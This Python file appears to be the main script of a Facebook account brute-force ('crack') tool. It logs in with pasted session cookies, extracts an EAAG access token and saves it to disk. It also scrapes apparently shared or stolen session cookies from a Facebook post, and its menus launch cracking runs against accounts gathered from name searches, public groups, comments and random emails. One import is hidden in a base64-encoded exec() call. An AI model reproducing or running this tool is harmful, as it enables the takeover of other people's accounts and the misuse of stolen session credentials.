###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json, threading,platform,string
import urllib3
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Cannot Install Rich Module, Try Manual Install (pip install rich)')
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from time import sleep
ses = requests.Session()
device = platform.platform()

###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.table import Table as me
from rich.console import Console as sol
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
exec(base64.b64decode(b'ZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBjZXRhaw=='))
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
console = Console()

###----------[ IMPORT FILE FROM DIRECTORY ]---------- ###
from src import menu as Menu
from src import dump as Dump
from src import lain as Lain

###----------[ COLOR FOR PRINT ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
N = '\x1b[0m'	# WARNA MATI

###----------[ COLOR FOR RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
P2 = "[#00FF00]" # HIJAU
B2 = "[#00C8FF]" # BIRU
O2 = "[#00FFFF]" # BIRU MUDA
H2 = "[#FFFFFF]" # PUTIH

###----------[ GLOBAL NAME ]---------- ###
ses = requests.Session()
reset = "[/]"
IP = requests.get("http://ip-api.com/json/").json()["query"]
negara = requests.get("http://ip-api.com/json/").json()["country"]
datt = []
zxc = "fbkey"
ff = "fall"
xv = "xavier"

###----------[ CHECK THEME COLOR ]---------- ###
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"

###----------[ CLEAR TERMINAL ]---------- ###
def clear_screen():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass

###----------[ GET TIME ]---------- ###
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "good morning"
	elif 12 <= hours < 15:timenow = "good afternoon"
	elif 15 <= hours < 18:timenow = "good evening"
	else:timenow = "good night"
	return timenow

###----------[ LOGO ]---------- ###
def logo():
	clear_screen()
	prints(Panel(f"""{color_rich}             © Brute forse Facebook account
▄▄▄▄· ▄▄▄  ▄• ▄▌▄▄▄▄▄▄▄▄ .    ·▄▄▄▄▄▄▄· ©   
▐█ ▀█▪▀▄ █·█▪██▌•██  ▀▄.▀·    ▐▄▄·▐█ ▀█▪. Author :MUSLIM-XD
▐█▀▀█▄▐▀▀▄ █▌▐█▌ ▐█.▪▐▀▀▪▄    ██▪ ▐█▀▀█▄. Wa +213554740646
██▄▪▐█▐█•█▌▐█▄█▌ ▐█▌·▐█▄▄▌    ██▌.██▄▪▐█. Status : premium
·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀█{reset}
           |.  \    /:  ||: |_)  :)(:  (      Multiple Bruteforce Tools 
           |___|\__/|___|(_______/  \__/      Made By {M2}Bang{H2}ladeshi {P2}Coder""",title=f"{P2}{waktu()}",style=f"{color_table}"))


###----------[ LOGIN ]---------- ###
def login():
	logo()
	nama = "-"
	uid = "-"
	ttl = "-"
	email = "github.com/mrxvaau"
	joined = "mafiavau"
	expired = "+8801923554174"
	datt.append(Panel(f"{P2}Name : {nama} \nID : {uid} \nDate of birth : {ttl}",width=37,title=f"{P2}data account",style=f"{color_table}"))
	datt.append(Panel(f"{P2}Github : {email} \nFacebook : {joined} \nWhatsapp : {expired}",width=37,title=f"{P2}Author",style=f"{color_table}"))
	console.print(Columns(datt))
	
	prints(Panel(f"{P2}{IP}",padding=(0,30),title=f"{P2}IP",subtitle=f"{H2}{negara}",style=f"{color_table}"))
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. login tools using cookie  [{color_rich}04{P2}]. see all results crack
[{color_rich}02{P2}]. free cookies for login    [{color_rich}05{P2}]. checkpoint detector
[{color_rich}03{P2}]. crack menu without login  [{color_rich}06{P2}]. change theme color""",width=80,padding=(0,5),style=f"{color_table}"))
	log = input(f" {N}input choice : ")
	if log in["1","01"]:
		prints(Panel(f"""{P2}please enter cookies and do not use your personal account for sacrifice""",width=80,style=f"{color_table}"))
		cookie = input(f" {N}cookie : ")
		login_cookie(cookie)
	elif log in["2","02"]:
		free_cookies()
	elif log in["3","03"]:
		menu_crack_without_login()
	elif log in["4","04"]:
		Lain.see_results()
	elif log in["5","05"]:
		Lain.check_option()
	elif log in["6","06"]:
		prints(Panel(f"""{P2}feature is only available for admin ,you cant use that sorry 😔""",width=80,style=f"{color_table}"))
		exit()
	
def menu_crack_without_login():
	prints(Panel(f"""{P2}[{color_rich}01{P2}]. crack from search name v1  [{color_rich}04{P2}]. crack from public groups
[{color_rich}02{P2}]. crack from search name v2  [{color_rich}05{P2}]. crack from posts comments
[{color_rich}03{P2}]. crack from search name v3  [{color_rich}06{P2}]. crack from random email""",width=80,padding=(0,4),style=f"{color_table}"))
	ask = input(f" {N}input choice : ")
	if ask in["1","01"]:
		Dump.search_name_v1()
	elif ask in["2","02"]:
		Dump.search_name_v2()
	elif ask in["3","03"]:
		Dump.random_email()
	elif ask in["4","04"]:
		Dump.grup_no_login()
	elif ask in["5","05"]:
		Dump.public_comments_v2()
	elif ask in["6","06"]:
		Dump.random_email()
	else:
		login()

def login_cookie(cookie):
	try:
		data = ses.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie})
		find_token = re.search("(EAAG\w+)", data.text)
		open("data/token.txt", "w").write(find_token.group(1))
		open("data/cookie.txt", "w").write(cookie)
		prints(Panel(f"""{P2}{find_token.group(1)}""",width=80,style=f"{color_table}"))
		sleep(3)
		Menu.menu()
	except Exception as e:
		os.system("rm -f data/token.txt data/cookie.txt")
		prints(Panel(f"""{P2}cookie invalid,please try other cookie and make sure authentication off""",width=80,style=f"{color_table}"))
		exit()
		
def free_cookies():
	url = parser(ses.get("https://mbasic.facebook.com/100032386028880/posts/674525870303608/?app=fbl").text,"html.parser")
	data = re.findall('"text":"(.*?)"',str(url))
	cokxyz = []
	n = 0
	for cok in data:
		if len(cok)>=20:
			try:
				if cok in cokxyz:pass
				else:
					n +=1
					cokxyz.append(cok)
					prints(Panel(f"""{P2}[{n}]. {cok}""",width=80,style=f"{color_table}"))
			except:continue
	ask = input(f" {N}choose your number : ")
	try:
		cookie = cokxyz[int(ask)-1]
		login_cookie(cookie)
	except Exception as e:
		prints(Panel(f"""{P2}fill in using numbers instead of letters or something else""",width=80,style=f"{color_table}"))
		exit()